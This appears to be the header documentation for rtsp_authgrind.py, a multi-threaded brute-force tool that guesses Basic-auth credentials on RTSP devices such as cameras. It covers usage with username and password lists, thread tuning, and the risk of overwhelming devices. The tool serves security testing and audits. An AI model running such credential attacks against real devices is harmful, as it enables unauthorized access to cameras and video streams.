	rtsp_authgrind.py - A quick and simple tool to brute force credentials on rtsp
	services and devices. This is a multi-threaded brute forcing tool for testing,
	assessment and audit purposes only.

	RTSP Authentication Grinder is provided for testing purposes only and is not 
	authorized for use to conduct malicious, illegal or other nefarious activities.
	
	Standard usage is:
	
	python rtsp_authgrind [- l username | -L username list file] [-p password 
	| -P password list file] <target ip [:port]>
	
	A few things to know:
	1. rtsp devices can be overwhelmed so these default settings could easily cause an
	error: "Resource temporarily unavailable". Note there may be a bug that skips the
	checks when this happens, I am tracking that down.
	
	2. Starving the threads can happen (they block) if the THREADBLOCKSIZE is small. So
	if you have 10 threads and a block size of 10, you could get some of those threads
	doing a large amount of blocking on getting new work items, versus actually doing
	checks. I like the larger block size like 30, 50, 100... But it will have to depend
	on the number you have.
	
	3. This ONLY does BASIC auth right now. I have hooks in to do DIGEST auth later (see
	to do list)
